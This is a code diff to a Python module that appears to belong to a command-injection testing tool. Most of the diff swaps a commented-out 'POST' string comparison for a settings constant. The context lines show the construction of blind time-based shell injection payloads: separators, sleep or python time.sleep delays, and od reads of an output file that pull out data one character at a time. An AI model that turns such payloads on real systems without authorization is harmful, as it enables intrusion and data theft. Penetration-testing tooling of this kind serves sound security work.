@@ -89,7 +89,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "sleep " + str(timesec)
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
@@ -168,7 +168,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
@@ -287,7 +287,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "str1=$(od -A n -t d1<" + OUTPUT_TEXTFILE + ")" + separator +
                 "echo $str1 >" + OUTPUT_TEXTFILE 
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
       
     elif separator == "||" :                
@@ -371,7 +371,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "[ " + str(j) + " -eq ${str1} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator) 
 
     elif separator == "||" :     
@@ -449,7 +449,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "sleep " + str(timesec)
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
         
     elif separator == "||" :
@@ -522,7 +522,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
@@ -597,7 +597,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator +
                 "sleep " + str(timesec)
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
         
     elif separator == "||" :
@@ -665,7 +665,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
-      #if http_request_method == "POST":
+      #if http_request_method == settings.HTTPMETHOD.POST:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
